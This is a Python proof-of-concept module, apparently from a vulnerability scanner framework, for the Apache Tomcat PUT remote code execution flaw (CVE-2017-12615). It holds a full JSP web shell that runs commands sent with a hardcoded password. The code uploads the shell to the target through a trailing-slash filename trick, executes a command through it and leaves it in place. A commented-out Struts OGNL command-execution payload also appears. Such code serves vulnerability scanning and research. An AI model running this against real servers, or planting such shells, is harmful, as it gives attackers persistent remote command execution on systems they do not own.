# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import sys
import http.client
import urllib.request
import urllib.parse
import urllib.error
import time


class Vuln(ABVuln):
    vuln_id = 'Apache_Tomcat_0001'  # 平台漏洞编号，留空
    name = 'Apache Tomcat远程代码执行漏洞(CNVD-2017-27472)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-09-20'  # 漏洞公布时间
    desc = '''
        Apache Tomcat是美国阿帕奇（Apache）软件基金会下属的Jakarta项目的一款轻量级Web应用服务器，它主要用于开发和调试JSP程序，适用于中小型系统。
        Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当Tomcat运行在Windows主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的JSP文件，文件中的代码被服务器执行。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-27472'  # 漏洞来源https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw
    cnvd_id = 'CNVD-2017-27472'  # cnvd漏洞编号
    cve_id = 'CVE-2017-12615'  # cve编号
    product = 'Apache-Tomcat'  # 漏洞应用名称
    product_version = 'Apache Tomcat 7.0.0 - 7.0.79'  # 漏洞应用版本


body = '''''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp 
+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''


class Poc(ABPoc):
    poc_id = '639bd02b-2251-41a7-a36f-22d613c06aaf'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://github.com/Medicean/VulApps/tree/master/t/tomcat/1
            # payload = {'debug':'command','expression':'''(#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('echo 92933839f1efb2da9a4799753ee8d79c').getInputStream()))'''}
            proto, rest = urllib.parse.splittype(self.target)
            host, rest = urllib.parse.splithost(rest)
            conn = http.client.HTTPConnection(host)
            conn.request(method='OPTIONS', url='/ffffzz')
            headers = dict(conn.getresponse().getheaders())

            if 'allow' in headers and \
                    headers['allow'].find('PUT') > 0:
                conn.close()
                conn = http.client.HTTPConnection(host)
                url = "/" + str(int(time.time()))+'.jsp/'
                #url = "/" + str(int(time.time()))+'.jsp::$DATA'
                conn.request(method='PUT', url=url, body=body)
                res = conn.getresponse()
                if res.status == 201:
                    # print 'shell:', 'http://' + sys.argv[1] + url[:-7]
                    urldone = 'http://' + host + url[:-1]
                    #print (urldone)
                    payload = {'pwd': '023', 'cmd': 'id'}
                    request = requests.get(urldone, params=payload)
                    #print (request.url)
                    r = request.text
                    if 'uid=0(root) gid=0(root) groups=0(root)' in r:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

                elif res.status == 204:
                    print('file exists')
                else:
                    print('error')
                conn.close()
            else:
                print('Server not vulnerable')

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
